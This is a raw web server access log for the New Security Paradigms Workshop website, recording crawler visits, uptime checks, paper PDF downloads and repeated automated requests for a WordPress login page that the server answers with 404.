178.149.165.86 - - [02/May/2018:13:36:24 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.149.165.86 - - [02/May/2018:13:36:24 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:13:36:42 -0400] "GET /papers/2007/nspw2007-nali.pdf HTTP/1.1" 200 878662 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:13:37:31 -0400] "GET /2005/cfp/CFP.log HTTP/1.1" 200 9633 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.219 - - [02/May/2018:13:37:43 -0400] "GET / HTTP/1.1" 200 6606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:13:38:10 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.1 - - [02/May/2018:13:38:17 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 200 658653 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.1 - - [02/May/2018:13:38:57 -0400] "GET /robots.txt HTTP/1.1" 200 4979 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.236 - - [02/May/2018:13:41:07 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [02/May/2018:13:43:10 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
69.162.124.227 - - [02/May/2018:13:48:10 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
123.201.249.135 - - [02/May/2018:13:49:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
123.201.249.135 - - [02/May/2018:13:49:21 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:13:49:54 -0400] "GET /2005/cfp/Makefile HTTP/1.1" 200 3825 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:13:49:58 -0400] "GET /node/72 HTTP/1.1" 200 2956 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.215 - - [02/May/2018:13:50:08 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
187.78.1.75 - - [02/May/2018:13:50:12 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.78.1.75 - - [02/May/2018:13:50:15 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:13:50:18 -0400] "GET /papers/2004/ HTTP/1.1" 200 4363 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:13:50:32 -0400] "GET /2010/dates HTTP/1.1" 200 6721 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
95.212.170.96 - - [02/May/2018:13:52:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.212.170.96 - - [02/May/2018:13:52:17 -0400] "GET / HTTP/1.1" 200 8316 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.219 - - [02/May/2018:13:55:12 -0400] "GET /2005/pre-proceedings/julie_thorpe.pdf HTTP/1.1" 404 8067 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.64.215 - - [02/May/2018:13:56:14 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 200 658178 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
199.16.157.181 - - [02/May/2018:13:57:11 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
191.6.127.138 - - [02/May/2018:13:57:35 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.6.127.138 - - [02/May/2018:13:57:37 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
42.110.140.44 - - [02/May/2018:13:58:18 -0400] "GET /2018/cfp HTTP/1.1" 200 8166 "http://wiki.portal.chalmers.se/cse/pmwiki.php/Security/SecDeadlines?from=NS.SysSecDeadlines" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:19 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:19 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 4434 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:19 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:19 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 756 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 629 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "-" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:20 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:21 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:23 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:23 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:23 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:23 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:23 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:23 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 645 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:24 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:24 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
42.110.140.44 - - [02/May/2018:13:58:26 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
41.96.86.180 - - [02/May/2018:13:58:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.96.86.180 - - [02/May/2018:13:58:48 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:13:59:01 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
42.110.140.44 - - [02/May/2018:14:01:58 -0400] "GET /2018/dates HTTP/1.1" 200 3034 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
66.249.64.217 - - [02/May/2018:14:02:32 -0400] "GET /papers/2000/nspw2000-marceau.pdf HTTP/1.1" 200 1076682 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:14:04:01 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
39.59.83.112 - - [02/May/2018:14:04:03 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
39.59.83.112 - - [02/May/2018:14:04:05 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.120.253.147 - - [02/May/2018:14:05:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.120.253.147 - - [02/May/2018:14:05:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:14:05:20 -0400] "GET /2009/proceedings/2009/nspw2009-peisert.pdf HTTP/1.1" 200 1015650 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:14:06:17 -0400] "GET /2009/papers.shtml HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:14:06:20 -0400] "GET /2000/index.html HTTP/1.1" 200 2001 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:14:06:23 -0400] "GET /2011/cfp HTTP/1.1" 200 4988 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
117.70.61.129 - - [02/May/2018:14:07:07 -0400] "GET /papers/2000/nspw2000-rannenberg.pdf HTTP/1.1" 200 1062701 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
69.162.124.227 - - [02/May/2018:14:09:01 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:14:08:08 -0400] "GET /2009/proceedings/1997/nspw1997-cheung.pdf HTTP/1.1" 200 1446281 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:14:09:32 -0400] "GET /node/20 HTTP/1.1" 200 2732 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
139.5.229.211 - - [02/May/2018:14:09:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
139.5.229.211 - - [02/May/2018:14:09:48 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.217 - - [02/May/2018:14:10:49 -0400] "GET /papers/2002/nspw2002-bhattacharyya.pdf HTTP/1.1" 200 795322 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
84.245.15.191 - - [02/May/2018:14:13:36 -0400] "GET / HTTP/1.1" 200 6426 "-" "Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
84.245.15.191 - - [02/May/2018:14:13:37 -0400] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:37 -0400] "GET /apple-touch-icon-152x152.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:37 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:38 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:38 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:38 -0400] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:38 -0400] "GET /apple-touch-icon-152x152.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:38 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:38 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
84.245.15.191 - - [02/May/2018:14:13:38 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
69.162.124.227 - - [02/May/2018:14:14:01 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
119.160.71.88 - - [02/May/2018:14:14:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
119.160.71.88 - - [02/May/2018:14:14:56 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.219 - - [02/May/2018:14:14:58 -0400] "GET /2018/cfp HTTP/1.1" 200 8151 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
175.138.127.231 - - [02/May/2018:14:16:48 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
175.138.127.231 - - [02/May/2018:14:16:50 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
90.70.56.39 - - [02/May/2018:14:17:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
90.70.56.39 - - [02/May/2018:14:17:47 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:14:19:01 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
197.1.53.61 - - [02/May/2018:14:19:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.1.53.61 - - [02/May/2018:14:19:55 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:14:19:58 -0400] "GET /2007/cfp.shtml HTTP/1.1" 200 8420 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
117.24.38.177 - - [02/May/2018:14:18:26 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 200 662256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
77.88.47.40 - - [02/May/2018:14:20:49 -0400] "GET /papers/1994/nspw1994-essin.pdf HTTP/1.1" 200 933669 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.217 - - [02/May/2018:14:21:44 -0400] "GET /2005/PC/julie%20thorpe%20justification.pdf HTTP/1.1" 404 8060 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
157.55.39.141 - - [02/May/2018:14:21:36 -0400] "GET /papers/1998/nspw1998-jonsson.pdf HTTP/1.1" 200 671091 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [02/May/2018:14:21:53 -0400] "GET /papers/2012/docs/p67.pdf HTTP/1.1" 200 658398 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:14:24:01 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.152 - - [02/May/2018:14:25:32 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 200 485835 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
207.46.13.54 - - [02/May/2018:14:25:36 -0400] "GET /papers/1999/nspw1999-erlingsson.pdf HTTP/1.1" 200 867869 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.15.20 - - [02/May/2018:14:26:32 -0400] "GET /2005/cfp/latex/index.html%3fN=D HTTP/1.1" 200 7005 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.64.215 - - [02/May/2018:14:27:22 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.16.157.182 - - [02/May/2018:14:27:24 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
180.76.15.148 - - [02/May/2018:14:27:31 -0400] "GET /cfp/flyer_NSPW_2013.pdf HTTP/1.1" 200 95478 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.64.217 - - [02/May/2018:14:27:35 -0400] "GET /favicon.ico HTTP/1.1" 404 4094 "-" "Googlebot-Image/1.0"
66.102.6.199 - - [02/May/2018:14:27:39 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
180.76.15.23 - - [02/May/2018:14:28:31 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 7443 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [02/May/2018:14:29:01 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.141 - - [02/May/2018:14:29:31 -0400] "GET /node/3 HTTP/1.1" 200 11350 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
105.103.153.35 - - [02/May/2018:14:29:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.103.153.35 - - [02/May/2018:14:29:56 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.15.81.189 - - [02/May/2018:14:30:10 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.15.81.189 - - [02/May/2018:14:30:10 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.17 - - [02/May/2018:14:30:31 -0400] "GET /papers/2008/nspw2008-molloy.pdf HTTP/1.1" 200 1825536 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.142 - - [02/May/2018:14:31:31 -0400] "GET /papers/2003/nspw2003-jones.pdf HTTP/1.1" 200 723278 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.17 - - [02/May/2018:14:33:32 -0400] "GET /2006/ HTTP/1.1" 200 7999 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [02/May/2018:14:34:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.8 - - [02/May/2018:14:34:31 -0400] "GET /2004/nspw2004program.pdf HTTP/1.1" 200 30919 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.34 - - [02/May/2018:14:35:32 -0400] "GET /2009/ HTTP/1.1" 200 8144 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
181.73.37.94 - - [02/May/2018:14:35:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
181.73.37.94 - - [02/May/2018:14:35:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.30 - - [02/May/2018:14:36:32 -0400] "GET /2009/proceedings/1998/nspw1998-beaver.pdf HTTP/1.1" 200 1131111 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [02/May/2018:14:36:53 -0400] "GET /2005/cfp/latex/ieee.clo HTTP/1.1" 200 13278 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
